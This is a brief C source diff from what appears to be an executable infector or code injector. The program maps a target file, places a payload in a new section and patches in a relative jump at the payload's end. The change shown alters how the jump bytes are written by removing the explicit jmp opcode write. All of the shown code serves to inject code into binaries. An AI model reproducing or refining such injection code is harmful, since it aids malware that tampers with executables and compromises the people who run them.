@@ -199,8 +199,7 @@ int main(void) {
 
 	// // Write the relative jump instruction at the end of the payload
 	size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
-	*((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
-	memcpy(map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
+	memcpy(map + new_section_offset + jump_instr_offset, &jump_offset, sizeof(int32_t));
 
 	if (msync(map, new_filesize, MS_SYNC) == -1) {
 		perror("msync");
